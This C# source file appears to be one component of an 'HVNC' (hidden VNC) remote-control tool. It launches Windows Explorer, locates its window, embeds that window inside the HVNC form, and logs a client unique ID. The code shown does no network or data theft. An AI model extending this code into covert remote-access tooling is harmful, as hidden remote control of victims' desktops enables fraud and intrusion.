using System;
using System.Diagnostics;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

internal class ExplorerCommands
{
    public static async Task StartExplorer(string command) // Asynchronous method
    {
        // Launch Windows Explorer
        try
        {
            Console.WriteLine("Launch Windows Explorer.");
            Process explorerProcess = null;
            IntPtr explorerWindowHandle = IntPtr.Zero;

            // Launch Windows Explorer
            explorerProcess = Process.Start("explorer.exe");
            Console.WriteLine("Windows Explorer is running.");

            // Trying to launch Explorer and search for its window
            int failedAttempts = 0;
            // Endless cycle
            while (true)
            {
                // Finding a Windows Explorer Window
                bool success = await Task.Run(() =>
                {
                    return NativeMethods.EnumWindows((IntPtr hWnd, IntPtr lParam) =>
                    {
                        uint processId;
                        NativeMethods.GetWindowThreadProcessId(hWnd, out processId);
                        Process process = Process.GetProcessById((int)processId);

                        var classNameTask = GetExplorerWindowClassAsync(hWnd);
                        classNameTask.Wait(); // Waiting for an asynchronous method to complete

                        if (classNameTask.Result == "CabinetWClass") // If the process name and class name are the same
                        {
                            explorerWindowHandle = hWnd; // We get the process handle
                            return false;
                        }
                        return true;
                    }, IntPtr.Zero);
                });

                // If the window is found, exit the loop
                if (!success)
                {
                    break;
                }

                // If the window is not found, increase the counter of failed attempts
                Console.WriteLine("Windows Explorer window not found.");
                failedAttempts++;

                // If the number of unsuccessful attempts has reached the limit, terminate the Windows Explorer process
                if (failedAttempts >= 3)
                {
                    Console.WriteLine("The maximum number of failed attempts has been reached. The Windows Explorer process will be terminated.");
                    explorerProcess?.Kill();
                    break;
                }
            }

            // If a Windows Explorer window is found, set it as a child of the HVNC form
            if (explorerWindowHandle != IntPtr.Zero)
            {
                StringBuilder className = new StringBuilder(256);
                NativeMethods.GetClassName(explorerWindowHandle, className, className.Capacity);
                Console.WriteLine($"Descriptor okna provodnika Windows: {explorerWindowHandle.ToInt64():X8}");
                Console.WriteLine($"Window class name: {className}");

                // Setting a Windows Explorer window as a child of an HVNC form
                Variables.hvncForm.Invoke((MethodInvoker)delegate {
                    NativeMethods.SetParent(explorerWindowHandle, Variables.hvncForm.Handle);
                });

                // Changing the Windows Explorer window style to child
                IntPtr style = NativeMethods.GetWindowLong(explorerWindowHandle, NativeMethods.GWL_STYLE);
                NativeMethods.SetWindowLong(explorerWindowHandle, NativeMethods.GWL_STYLE, new IntPtr(style.ToInt64() | NativeMethods.WS_CHILD));

                // Centering a Windows Explorer Window Inside an HVNC Form
                await CenterExplorerWindowAsync(explorerWindowHandle, Variables.hvncForm);
                // Printing a unique identifier to the console
                Console.WriteLine($"Unique ID: {Variables.uniqueId}");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error when starting/searching Windows Explorer: " + ex.Message);
        }
    }

    // Method to get Windows Explorer window class
    static async Task<string> GetExplorerWindowClassAsync(IntPtr hWnd)
    {
        return await Task.Run(() =>
        {
            StringBuilder className = new StringBuilder(256);
            NativeMethods.GetClassName(hWnd, className, className.Capacity);
            return className.ToString();
        });
    }

    // Method to center Windows Explorer window inside HVNC form
    static async Task CenterExplorerWindowAsync(IntPtr explorerWindowHandle, Form form)
    {
        await Task.Run(() =>
        {
            NativeMethods.RECT rect;
            NativeMethods.GetWindowRect(explorerWindowHandle, out rect);
            // Height and width of Windows Explorer window
            int explorerWidth = rect.Right - rect.Left;
            int explorerHeight = rect.Bottom - rect.Top;

            // Height and width of the form window
            int formWidth = form.ClientSize.Width;
            int formHeight = form.ClientSize.Height;

            // Form window height and width subtracts the form's width and height and then divides the resulting value by 2
            int explorerX = (formWidth - explorerWidth) / 2;
            int explorerY = (formHeight - explorerHeight) / 2;

            NativeMethods.SetWindowPos(explorerWindowHandle, IntPtr.Zero, explorerX, explorerY, explorerWidth, explorerHeight, (uint)(NativeMethods.SetWindowPosFlags.SWP_NOZORDER | NativeMethods.SetWindowPosFlags.SWP_NOSIZE));
        });
    }
}
